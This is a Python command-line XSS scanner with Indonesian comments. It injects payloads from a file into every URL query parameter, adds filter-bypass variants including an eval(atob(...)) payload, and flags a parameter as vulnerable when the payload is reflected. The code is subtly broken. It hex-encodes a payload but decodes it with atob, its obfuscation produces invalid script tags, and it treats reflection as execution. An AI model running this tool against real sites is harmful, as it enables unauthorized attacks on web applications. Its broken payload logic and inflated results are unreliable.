import argparse
import requests
from urllib.parse import urlparse, urlencode, parse_qs
from colorama import Fore, init
from datetime import datetime  # Tambahkan import ini
import random
import string

# Inisialisasi colorama untuk mendukung pewarnaan teks di terminal
init(autoreset=True)


def send_request(url, headers=None):
    try:
        response = requests.get(url, headers=headers, timeout=10)
        return response
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Request failed: {e}")
        return None


def generate_obfuscated_payload(payload):
    obfuscated_payload = payload.replace(
        "<script>", "/*<*/script/*>*/").replace("</script>", "/*<*/script/*>*/")
    return obfuscated_payload


def generate_random_payload():
    basic_payload = "<script>alert('XSS');</script>"
    payload_base64 = basic_payload.encode('utf-8').hex()
    return f"eval(atob('{payload_base64}'))"


def test_xss(url, xss_payloads, output_file=None):
    print(f"[INFO] Testing XSS on {url}\n")
    results = []
    parsed_url = urlparse(url)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
    params = parse_qs(parsed_url.query)

    if not params:
        print("[INFO] No parameters found in the URL to test.")
        return

    # Cek setiap parameter URL untuk kerentanannya
    for param_name in params:
        for payload in xss_payloads:
            timestamp = datetime.now().strftime('%H:%M:%S')   # Waktu sekarang
            modified_params = {**params, param_name: [payload]}
            query_string = urlencode(modified_params, doseq=True)
            test_url = f"{base_url}?{query_string}"
            print(
                f"{Fore.BLUE}[{timestamp}] {Fore.WHITE}[TESTING] XSS URL: {test_url}")

            response = send_request(test_url)

            if response and payload in response.text:
                result = f"{Fore.BLUE}[{timestamp}] {Fore.RED}[VULNERABLE - XSS] Parameter '{param_name}' executed payload: {payload}{Fore.RESET}"
                print(result)
                results.append(result)
            else:
                print(
                    f"{Fore.BLUE}[{timestamp}] {Fore.WHITE}[SAFE - XSS] Parameter '{param_name}' did not execute payload: {payload}"
                )

    if output_file:
        with open(output_file, 'a') as file:
            file.write("\n".join(results) + "\n")
        print(
            f"\n[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [INFO] Results saved to: {output_file}")


def load_payloads(file_path):
    try:
        with open(file_path, 'r') as file:
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print("[ERROR] Payload file not found! Exiting.")
        return []


def main():
    print(r"""
   ___  ____  ____________  _  ___  __________
  / _ \/ __ \/  _/ __/ __ \/ |/ / |/_/ __/ __/
 / ___/ /_/ // /_\ \/ /_/ /    />  <_\ \_\ \  
/_/   \____/___/___/\____/_/|_/_/|_/___/___/    

   XSS Vulnerability Testing Tool
    """)

    parser = argparse.ArgumentParser(description="XSS Vulnerability Tester")
    parser.add_argument(
        "-u", "--url", help="Single URL to test (e.g., https://example.com/search?q=test)"
    )
    parser.add_argument(
        "-f", "--file", help="File containing multiple URLs to test"
    )
    parser.add_argument(
        "-p", "--payloads", required=True, help="File containing XSS payloads"
    )
    parser.add_argument(
        "-o", "--output", help="Output file to save results (optional)"
    )

    args = parser.parse_args()

    if not args.url and not args.file:
        print("[ERROR] Either --url or --file must be provided. Exiting.")
        return

    payloads = load_payloads(args.payloads)
    if not payloads:
        print("[ERROR] No payloads loaded. Exiting.")
        return

    if args.url:
        urls = [args.url]
    elif args.file:
        try:
            with open(args.file, 'r') as file:
                urls = [line.strip() for line in file if line.strip()]
        except FileNotFoundError:
            print("[ERROR] URL file not found! Exiting.")
            return

    for url in urls:
        bypassed_payloads = [generate_obfuscated_payload(
            p) for p in payloads] + [generate_random_payload()]
        test_xss(url, bypassed_payloads, output_file=args.output)


if __name__ == "__main__":
    main()
